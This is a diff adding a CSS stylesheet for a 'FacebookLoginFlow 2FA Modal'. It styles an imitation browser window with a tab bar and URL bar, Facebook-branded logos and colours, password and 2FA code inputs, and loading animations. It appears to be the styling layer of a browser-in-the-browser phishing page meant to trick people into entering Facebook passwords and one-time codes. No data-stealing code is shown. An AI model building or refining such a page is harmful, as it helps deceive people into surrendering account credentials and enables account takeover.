@@ -1,0 +1,358 @@
+/* ✅ FIXED + OPTIMIZED CSS for FacebookLoginFlow 2FA Modal */
+
+body {
+  margin: 0;
+  background: #f0f2f5;
+  font-family: -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+}
+
+.popup-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background: rgba(0, 0, 0, 0.3);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 9999;
+}
+
+.browser-frame {
+  width: 520px;
+  margin: 40px auto;
+  border: 1px solid #ccc;
+  border-radius: 6px;
+  box-shadow: 0 0 12px rgba(0, 0, 0, 0.2);
+  display: block;
+}
+
+.browser-top {
+  background: #e1e1e1;
+  height: 30px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0 10px;
+  font-size: 13px;
+}
+
+.tab-title {
+  display: flex;
+  align-items: center;
+}
+
+.tab-title img {
+  width: 16px;
+  height: 16px;
+  margin-right: 6px;
+}
+
+.browser-url {
+  background: #f7f7f7;
+  font-size: 13px;
+  padding: 5px 10px;
+  border-top: 1px solid #ccc;
+  border-bottom: 1px solid #ccc;
+}
+
+.green {
+  color: green;
+  font-weight: bold;
+}
+
+.content {
+  background: #fff;
+  padding: 30px 25px;
+  text-align: center;
+}
+
+.logo {
+  font-size: 38px;
+  color: #1877f2;
+  font-weight: 600;
+  margin-bottom: 12px;
+}
+
+.card h2 {
+  font-size: 20px;
+  margin-bottom: 18px;
+  margin-top: 0;
+  color: #1c1e21;
+}
+
+.alert {
+  background-color: #fff8c5;
+  border: 1px solid #f1e9c0;
+  padding: 10px;
+  border-radius: 6px;
+  font-size: 14px;
+  margin-bottom: 15px;
+}
+
+.alert.error {
+  border-color: #e53935;
+  background-color: #ffeaea;
+  color: #e53935;
+}
+
+input[type="text"],
+input[type="password"],
+input[type="number"],
+.btn-primary,
+.btn-secondary {
+  width: 100%;
+  box-sizing: border-box;
+}
+
+input[type="text"],
+input[type="password"],
+input[type="number"] {
+  padding: 14px;
+  margin-bottom: 14px;
+  border: 1px solid #ccd0d5;
+  border-radius: 6px;
+  font-size: 16px;
+  background-color: #f5f6f7;
+}
+
+input:focus {
+  border-color: #1877f2;
+  outline: none;
+  background-color: #fff;
+}
+
+.btn-primary,
+.btn-secondary {
+  padding: 14px;
+  font-size: 17px;
+  border: none;
+  border-radius: 10px;
+  cursor: pointer;
+  transition: background-color 0.3s ease;
+}
+
+.btn-primary {
+  background: #1877f2;
+  color: white;
+  margin-bottom: 10px;
+}
+
+.btn-primary:disabled {
+  background: #a6c8ff;
+  cursor: not-allowed;
+}
+
+.btn-primary:hover:not(:disabled) {
+  background: #165eab;
+}
+
+.btn-secondary {
+  background: #f0f2f5;
+  color: #444;
+}
+
+.footer {
+  font-size: 14px;
+  color: #65676b;
+  margin-top: 12px;
+}
+
+.footer a {
+  color: #1877f2;
+  text-decoration: none;
+}
+
+.footer a:hover {
+  text-decoration: underline;
+}
+
+/* Spinner */
+.loading-spinner {
+  width: 60px;
+  height: 60px;
+  border: 6px solid #f3f3f3;
+  border-top: 6px solid #1877f2;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  margin: 30px auto;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+.loading-screen {
+  text-align: center;
+}
+
+.loading-screen p {
+  margin-top: 16px;
+  font-size: 16px;
+  color: #555;
+}
+
+/* Illustration */
+.illustration {
+  height: 220px;
+  margin-bottom: 25px;
+  background-image: url('https://i.ibb.co/jkJx9rNp/auther.png');
+  background-size: contain;
+  background-repeat: no-repeat;
+  background-position: center;
+}
+
+/* 2FA style override */
+.code-note {
+  font-size: 14px;
+  color: #5d6c7b;
+  font-weight: 400;
+  margin-bottom: 12px;
+}
+
+.code-input {
+  padding: 18px;
+  border: 1px solid #ccd3db;
+  border-radius: 12px;
+  font-size: 16px;
+  font-weight: 500;
+}
+
+.btn-primary.continue-2fa {
+  border-radius: 22px;
+  font-size: 15px;
+  font-weight: 500;
+  background: #1877f2;
+}
+
+#loadFacebookG {
+  width: 150px;
+  height: 20px;
+  margin: 0 auto 20px;
+  position: relative;
+}
+
+.facebook_blockG {
+  background-color: #1877f2;
+  width: 20px;
+  height: 20px;
+  border-radius: 3px;
+  position: absolute;
+  top: 0;
+  animation: bounceG 1.2s infinite;
+}
+
+#blockG_1 { left: 0; animation-delay: 0.1s; }
+#blockG_2 { left: 30px; animation-delay: 0.2s; }
+#blockG_3 { left: 60px; animation-delay: 0.3s; }
+
+@keyframes bounceG {
+  0% { transform: scale(1); }
+  50% { transform: scale(0.3); }
+  100% { transform: scale(1); }
+}
+
+/* Mobile tweaks */
+@media (max-width: 600px) {
+  .browser-frame {
+    width: 95%;
+    margin: auto;
+  }
+
+  .content {
+    padding: 20px 15px;
+  }
+
+  .card {
+    padding: 20px 15px;
+    max-width: 100%;
+  }
+
+  .logo {
+    font-size: 32px;
+  }
+
+  .card h2 {
+    font-size: 18px;
+  }
+
+  input[type="text"],
+  input[type="password"],
+  input[type="number"] {
+    padding: 12px;
+    font-size: 15px;
+  }
+
+  .btn-primary,
+  .btn-secondary {
+    padding: 12px;
+    font-size: 16px;
+  }
+
+  .footer {
+    font-size: 13px;
+  }
+
+  .illustration {
+    height: 160px;
+    margin-bottom: 20px;
+  }
+
+  .browser-top {
+    font-size: 12px;
+    padding: 0 8px;
+    height: 28px;
+  }
+
+  .browser-url {
+    font-size: 12px;
+    padding: 4px 8px;
+  }
+
+  .tab-title img {
+    width: 14px;
+    height: 14px;
+    margin-right: 4px;
+  }
+}
+
+.error-inline {
+  color: red;
+  font-size: 14px;
+  text-align: left;
+  margin-top: -6px;
+  margin-bottom: 12px;
+  padding-left: 4px;
+}
+
+.facebook-logo h1 {
+  font-size: 40px;
+  color: #1877f2;
+  font-weight: 600;
+  letter-spacing: -1px;
+  text-align: center;
+  margin-top: 10px;
+}
+
+.facebook-logo-container {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  margin-top: 20px;
+}
+
+.facebook-logo {
+  font-size: 40px;
+  font-weight: 600;
+  color: #1877f2;
+  letter-spacing: -1px;
+}
+
+.divider {
+  width: 60%;
+  border: 1px solid #ddd;
+  margin-top: 10px;
+  margin-bottom: 20px;
+}
